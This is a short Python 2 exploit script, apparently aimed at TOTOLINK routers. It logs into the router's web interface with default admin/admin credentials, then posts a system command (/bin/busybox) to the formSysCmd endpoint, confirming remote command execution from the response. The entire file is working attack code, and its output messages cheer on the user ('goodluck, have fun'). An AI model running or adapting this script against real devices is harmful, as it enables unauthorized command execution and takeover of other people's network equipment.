#!/usr/bin/python 

import requests
import sys

USAGE = "Usage: totolink_backdoor.py [-i target_ip]"
DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD = "admin"
DEFAULT_IP = "192.168.1.1"
target_ip = DEFAULT_IP
string_to_found = 'Usage: busybox [function] [arguments]...'

def main():
	
	global target_ip

	for i in range(len(sys.argv)):
		if sys.argv[i] == "-i":
			target_ip = sys.argv[i+1]
			i = i + 1
	
	login_admin(DEFAULT_USERNAME, DEFAULT_PASSWORD)

	url = 'http://' + target_ip + '/boafrm/formSysCmd'
	post_data = {
			'sysCmdselect': 6,
			'apply': 'run+command',
			'sysCmd': '/bin/busybox',
			'submit-url': '/syscmd.htm',
			'msg': ''
			}

	r = requests.post(url, post_data)

	if r.text.find("Usage: busybox [function] [arguments]...") < 0:
		not_vulnerable_handler()
	else:
		vulnerable_handler()
		print r.text


def login_admin(username, password):
	
	global target_ip
	login_url = 'http://' + target_ip + '/boafrm/formLogin'
	post_data = {
			'submit-url': '/login.htm',
			'userAgent': 'Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:45.0)+Gecko/20100101+Firefox/45.0',
			'username': username,
			'userpass': password,
			'x': '99',
			'y': '19'
			}
	try:
		r = requests.post(login_url, post_data, timeout = 3)
		print (r.status_code, r.reason)
	except:
		not_vulnerable_handler()

def vulnerable_handler():
	print "device is vulnerable to exploit :)... goodluck, have fun"
	exit(1)
def not_vulnerable_handler():
	print("device is not vulneraable to exploit.. try something else :'(")
	exit(0)

if __name__ == "__main__":
	main()
